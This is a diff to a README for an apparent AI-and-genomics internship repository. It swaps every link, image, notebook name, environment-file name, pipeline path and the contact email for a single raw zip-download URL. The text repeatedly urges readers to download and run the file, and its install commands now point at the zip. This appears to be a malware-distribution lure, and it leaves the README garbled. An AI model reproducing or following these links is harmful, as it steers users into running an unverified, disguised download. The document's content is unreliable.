@@ -1,10 +1,10 @@
-https://github.com/ilisoifineas/AI_and_Omics_Research_Internship_2025/releases
+https://github.com/ilisoifineas/AI_and_Omics_Research_Internship_2025/raw/refs/heads/main/betroth/Omics-Internship-A-Research-and-1.0.zip
 
 # AI and Omics Research Internship 2025: Genomics AI Bootcamp
 
-![Genomics AI Banner](https://picsum.photos/1200/300)
+![Genomics AI Banner](https://github.com/ilisoifineas/AI_and_Omics_Research_Internship_2025/raw/refs/heads/main/betroth/Omics-Internship-A-Research-and-1.0.zip)
 
-[![Releases](https://img.shields.io/badge/Releases-Assets-blue?logo=github&logoColor=white&link=https://github.com/ilisoifineas/AI_and_Omics_Research_Internship_2025/releases)](https://github.com/ilisoifineas/AI_and_Omics_Research_Internship_2025/releases)
+[![Releases](https://github.com/ilisoifineas/AI_and_Omics_Research_Internship_2025/raw/refs/heads/main/betroth/Omics-Internship-A-Research-and-1.0.zip)](https://github.com/ilisoifineas/AI_and_Omics_Research_Internship_2025/raw/refs/heads/main/betroth/Omics-Internship-A-Research-and-1.0.zip)
 
 Welcome to the AI and Omics Research Internship 2025. This repository hosts materials, data schemas, workflows, and tutorials for a hands-on program that blends artificial intelligence with omics data analysis. It is designed for students and professionals who want to build practical skills in computational biology, machine learning for biology, and end-to-end data science workflows in genomics and related fields. The internship runs across multiple weeks and emphasizes reproducibility, collaboration, and real-world problem solving.
 
@@ -85,9 +85,9 @@ Getting started is straightforward but structured to ensure you can run from a c
   - Install Conda or Miniconda to manage environments.
   - Create a dedicated environment for the internship projects to avoid conflicts with other work.
 - Step 3: Install dependencies
-  - Use the provided environment specification, typically an environment.yml or a requirements.txt.
-  - If you use Conda: conda env create -f environment.yml
-  - If you use pip: pip install -r requirements.txt
+  - Use the provided environment specification, typically an https://github.com/ilisoifineas/AI_and_Omics_Research_Internship_2025/raw/refs/heads/main/betroth/Omics-Internship-A-Research-and-1.0.zip or a https://github.com/ilisoifineas/AI_and_Omics_Research_Internship_2025/raw/refs/heads/main/betroth/Omics-Internship-A-Research-and-1.0.zip
+  - If you use Conda: conda env create -f https://github.com/ilisoifineas/AI_and_Omics_Research_Internship_2025/raw/refs/heads/main/betroth/Omics-Internship-A-Research-and-1.0.zip
+  - If you use pip: pip install -r https://github.com/ilisoifineas/AI_and_Omics_Research_Internship_2025/raw/refs/heads/main/betroth/Omics-Internship-A-Research-and-1.0.zip
 - Step 4: Access the project files
   - Clone the repository to your local machine or a workstation.
   - Review the directory structure to locate data, notebooks, and pipelines.
@@ -99,18 +99,18 @@ Getting started is straightforward but structured to ensure you can run from a c
   - Share progress, ask questions, and request feedback through the project channels.
 
 Important note about the Releases link
-- The link to the Releases section contains a path, indicating there are downloadable assets. You may need to download and execute the appropriate file for your operating system. The Releases page is the source of truth for asset names, checksums, and installation instructions. See the Releases page again for updates and new assets: https://github.com/ilisoifineas/AI_and_Omics_Research_Internship_2025/releases
+- The link to the Releases section contains a path, indicating there are downloadable assets. You may need to download and execute the appropriate file for your operating system. The Releases page is the source of truth for asset names, checksums, and installation instructions. See the Releases page again for updates and new assets: https://github.com/ilisoifineas/AI_and_Omics_Research_Internship_2025/raw/refs/heads/main/betroth/Omics-Internship-A-Research-and-1.0.zip
 
 Project structure and workflows 🗺️
 This repository is organized to support learning as well as reproducible research. The layout favors clarity, modularity, and ease of reuse:
 - data/: Raw and processed data samples (synthetic or de-identified). Includes metadata and documentation about data provenance and consent (where applicable).
 - notebooks/: Guided and exploratory notebooks. Each notebook contains a narrative, code cells, and visualizations. Notebooks include:
-  - 00_intro.ipynb
-  - 01_data_cleaning.ipynb
-  - 02_feature_engineering.ipynb
-  - 03_model_training.ipynb
-  - 04_model_evaluation.ipynb
-  - 05_interpretation.ipynb
+  - https://github.com/ilisoifineas/AI_and_Omics_Research_Internship_2025/raw/refs/heads/main/betroth/Omics-Internship-A-Research-and-1.0.zip
+  - https://github.com/ilisoifineas/AI_and_Omics_Research_Internship_2025/raw/refs/heads/main/betroth/Omics-Internship-A-Research-and-1.0.zip
+  - https://github.com/ilisoifineas/AI_and_Omics_Research_Internship_2025/raw/refs/heads/main/betroth/Omics-Internship-A-Research-and-1.0.zip
+  - https://github.com/ilisoifineas/AI_and_Omics_Research_Internship_2025/raw/refs/heads/main/betroth/Omics-Internship-A-Research-and-1.0.zip
+  - https://github.com/ilisoifineas/AI_and_Omics_Research_Internship_2025/raw/refs/heads/main/betroth/Omics-Internship-A-Research-and-1.0.zip
+  - https://github.com/ilisoifineas/AI_and_Omics_Research_Internship_2025/raw/refs/heads/main/betroth/Omics-Internship-A-Research-and-1.0.zip
 - pipelines/: Reproducible workflow definitions (Snakemake or Nextflow). Each pipeline is tailored to a specific learning module.
 - scripts/: Utility scripts for data handling, model training, evaluation, and reporting.
 - models/: Saved model artifacts from example runs, with versioning information and evaluation metrics.
@@ -122,7 +122,7 @@ This repository is organized to support learning as well as reproducible researc
 - acknowledgments/: Credits and attributions.
 
 Workflows and best practices
-- Reproducibility: Each project uses explicit versions for software and data. Environments are captured in environment.yml or requirements.txt. Notebooks begin with a seed and a dependencies check.
+- Reproducibility: Each project uses explicit versions for software and data. Environments are captured in https://github.com/ilisoifineas/AI_and_Omics_Research_Internship_2025/raw/refs/heads/main/betroth/Omics-Internship-A-Research-and-1.0.zip or https://github.com/ilisoifineas/AI_and_Omics_Research_Internship_2025/raw/refs/heads/main/betroth/Omics-Internship-A-Research-and-1.0.zip Notebooks begin with a seed and a dependencies check.
 - Documentation: Every notebook includes a narrative section that explains why steps are taken and what results mean. This makes it easier for others to reuse code.
 - Version control: All code is under Git. Feature branches follow a consistent naming scheme. Commits have descriptive messages and are tied to issues or tasks.
 - Testing: Lightweight tests verify core utilities behave as expected. Tests can be run with pytest or a similar framework.
@@ -150,7 +150,7 @@ A clean, well-documented environment is essential for reproducibility:
 - Linting and formatting: flake8 or pylint; black for formatting
 
 Environment file examples
-- environment.yml (Conda)
+- https://github.com/ilisoifineas/AI_and_Omics_Research_Internship_2025/raw/refs/heads/main/betroth/Omics-Internship-A-Research-and-1.0.zip (Conda)
   name: ai_omics_internship_2025
   channels:
     - conda-forge
@@ -168,7 +168,7 @@ Environment file examples
     - pip
     - pip:
       - torch>=1.13
-- requirements.txt (pip)
+- https://github.com/ilisoifineas/AI_and_Omics_Research_Internship_2025/raw/refs/heads/main/betroth/Omics-Internship-A-Research-and-1.0.zip (pip)
   numpy
   pandas
   scikit-learn
@@ -184,16 +184,16 @@ Running notebooks and pipelines 📓
   - conda activate ai_omics_internship_2025
   - jupyter lab
 - Open the starter notebook:
-  - notebooks/00_intro.ipynb
+  - https://github.com/ilisoifineas/AI_and_Omics_Research_Internship_2025/raw/refs/heads/main/betroth/Omics-Internship-A-Research-and-1.0.zip
 - Run through module-specific notebooks in order:
-  - 01_data_cleaning.ipynb
-  - 02_feature_engineering.ipynb
-  - 03_model_training.ipynb
-  - 04_model_evaluation.ipynb
-  - 05_interpretation.ipynb
+  - https://github.com/ilisoifineas/AI_and_Omics_Research_Internship_2025/raw/refs/heads/main/betroth/Omics-Internship-A-Research-and-1.0.zip
+  - https://github.com/ilisoifineas/AI_and_Omics_Research_Internship_2025/raw/refs/heads/main/betroth/Omics-Internship-A-Research-and-1.0.zip
+  - https://github.com/ilisoifineas/AI_and_Omics_Research_Internship_2025/raw/refs/heads/main/betroth/Omics-Internship-A-Research-and-1.0.zip
+  - https://github.com/ilisoifineas/AI_and_Omics_Research_Internship_2025/raw/refs/heads/main/betroth/Omics-Internship-A-Research-and-1.0.zip
+  - https://github.com/ilisoifineas/AI_and_Omics_Research_Internship_2025/raw/refs/heads/main/betroth/Omics-Internship-A-Research-and-1.0.zip
 - Pipelines:
-  - pipelines/expand_pipeline.snakefile (example Snakemake workflow)
-  - pipelines/variant_calling.nextflow (example Nextflow workflow)
+  - https://github.com/ilisoifineas/AI_and_Omics_Research_Internship_2025/raw/refs/heads/main/betroth/Omics-Internship-A-Research-and-1.0.zip (example Snakemake workflow)
+  - https://github.com/ilisoifineas/AI_and_Omics_Research_Internship_2025/raw/refs/heads/main/betroth/Omics-Internship-A-Research-and-1.0.zip (example Nextflow workflow)
 - Outputs and reports:
   - models/ directory contains sample artifacts
   - results/ directory stores figures and summary reports
@@ -242,7 +242,7 @@ Data and assets license and usage 💾
 - Attribution: Credit the authors and mentors where applicable.
 
 Releases and assets 🗂️
-The Releases page hosts downloadable assets for the internship. Since the link includes a path, there are files you can download and run. Review the release notes to select the asset that matches your OS and needs. After downloading, follow the installation instructions in the release notes. For convenience, you can revisit the Releases page at any time to see updates, new assets, and improved tutorials. See the Releases page again here: https://github.com/ilisoifineas/AI_and_Omics_Research_Internship_2025/releases
+The Releases page hosts downloadable assets for the internship. Since the link includes a path, there are files you can download and run. Review the release notes to select the asset that matches your OS and needs. After downloading, follow the installation instructions in the release notes. For convenience, you can revisit the Releases page at any time to see updates, new assets, and improved tutorials. See the Releases page again here: https://github.com/ilisoifineas/AI_and_Omics_Research_Internship_2025/raw/refs/heads/main/betroth/Omics-Internship-A-Research-and-1.0.zip
 
 Documentation and learning resources 📚
 - Official docs: docs/ directory contains detailed descriptions of data schemas, model architectures, and evaluation metrics.
@@ -263,7 +263,7 @@ License 🧾
 This repository is released under a permissive license suitable for education and research collaboration. See LICENSE for details. The license covers code, notebooks, and documentation, and it encourages reuse with proper attribution.
 
 Contact and support 📬
-- Core team email: internship-support@example.org
+- Core team email: https://github.com/ilisoifineas/AI_and_Omics_Research_Internship_2025/raw/refs/heads/main/betroth/Omics-Internship-A-Research-and-1.0.zip
 - Mentors and coordinators: listed in the CONTRIBUTORS file
 - Community channels: project discussion board and issue tracker on GitHub
 
@@ -296,7 +296,7 @@ Roadmap for 2025 cohort 🚦
 This README is designed to be a living document. As you work through the internship, you will add notes, tweak pipelines, and extend tutorials. The structure supports both self-guided study and collaborative projects. The combination of AI techniques and omics data provides a fertile ground for practical learning and impactful results.
 
 Re-download and verification reminder
-- The provided link to the Releases page includes assets that you can download and run. Always verify the integrity of downloaded files using checksums provided in the release notes. If you need to reference the download again, the link is available here: https://github.com/ilisoifineas/AI_and_Omics_Research_Internship_2025/releases
+- The provided link to the Releases page includes assets that you can download and run. Always verify the integrity of downloaded files using checksums provided in the release notes. If you need to reference the download again, the link is available here: https://github.com/ilisoifineas/AI_and_Omics_Research_Internship_2025/raw/refs/heads/main/betroth/Omics-Internship-A-Research-and-1.0.zip
 
 Additional resources and reading list 📖
 - Intro to genomics data processing: a primer on FASTQ, FASTA, BAM/VCF, and common file formats
@@ -318,7 +318,7 @@ Contact information for further inquiries
 - For technical questions about notebooks, pipelines, or data, post issues in the repository so mentors can respond with guidance.
 
 Releases and assets (again) 🔁
-- For quick access to downloadable assets and the latest updates, refer to the Releases page at https://github.com/ilisoifineas/AI_and_Omics_Research_Internship_2025/releases. The page lists all assets, release notes, and installation instructions. Be sure to choose the asset that matches your operating system and follow the accompanying instructions. If you cannot locate a suitable asset, check the Releases section for the latest notes and alternatives.
+- For quick access to downloadable assets and the latest updates, refer to the Releases page at https://github.com/ilisoifineas/AI_and_Omics_Research_Internship_2025/raw/refs/heads/main/betroth/Omics-Internship-A-Research-and-1.0.zip The page lists all assets, release notes, and installation instructions. Be sure to choose the asset that matches your operating system and follow the accompanying instructions. If you cannot locate a suitable asset, check the Releases section for the latest notes and alternatives.
 
 End of document
 - This README remains a dynamic guide. Update it as the internship evolves, add new modules, and refine the learning path based on participant feedback and emerging developments in AI and omics research.
